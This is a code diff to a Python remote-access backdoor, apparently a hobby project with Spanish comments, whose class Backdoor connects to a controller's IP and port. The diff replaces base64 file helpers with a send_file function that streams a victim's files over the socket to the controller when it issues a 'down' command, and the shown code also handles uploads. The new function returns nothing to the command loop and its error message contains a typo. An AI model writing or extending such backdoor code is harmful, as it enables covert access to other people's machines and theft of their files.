@@ -5,6 +5,7 @@ import json
 import os
 import shutil
 import sys
+import struct
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -66,33 +67,19 @@ class Backdoor:
             return '[-]El sistema no puede encontrar la ruta especificada'
     
     
-    def sendFileSize(self, file):
-        filesize = os.path.getsize(file)
-        self.connection.send(f'{file}|{filesize}'.encode())
-        with open(file, 'rb') as f:
-            while True:
-                bytesRead = f.read(self.BUFFER_SIZE)
-                if not bytesRead:
-                    break
-
-    
-    def writeFile(self, path, route, content):
+    def send_file(self, sck: socket.socket, filename):
         try:
-            contentToWrite = base64.b64decode(content)
-            if contentToWrite != b'[-]Archivo no encontrado':
-                with open(f'{route}{path}', 'wb') as file:
-                    file.write(contentToWrite)
-                    return b'[+]Descarga completa'
-            else: return b'[-]Descarga fallida'
+            # Obtener el tamaño del archivo a enviar.
+            filesize = os.path.getsize(filename)
+            # Informar primero al servidor la cantidad
+            # de bytes que serán enviados.
+            sck.sendall(struct.pack("<Q", filesize))
+            # Enviar el archivo en bloques de 1024 bytes.
+            with open(filename, "rb") as f:
+                while read_bytes := f.read(1024):
+                    sck.sendall(read_bytes)
         except FileNotFoundError:
-            return b'Archivo no encontrado'
-    
-    def readFile(self, path):
-        try:
-            with open(path, 'rb') as file:
-                return base64.b64encode(file.read())
-        except FileNotFoundError:
-            return base64.b64encode(b'[-]Archivo no encontrado')
+            sck.sendall(b'[-]Archivo no encononontrado')
     
     def run(self):
         print(self.reliableRecieve())
@@ -107,7 +94,7 @@ class Backdoor:
                     commandResults = self.changeDirectory(' '.join(command[1:]))
 
                 elif command[0] == 'down':
-                    commandResults = self.readFile(' '.join(command[2:]))
+                    commandResults = self.send_file(self.connection, ' '.join(command[2:]))
 
                 elif command[0] == 'up':
                     file = os.path.basename(' '.join(command[3:]))
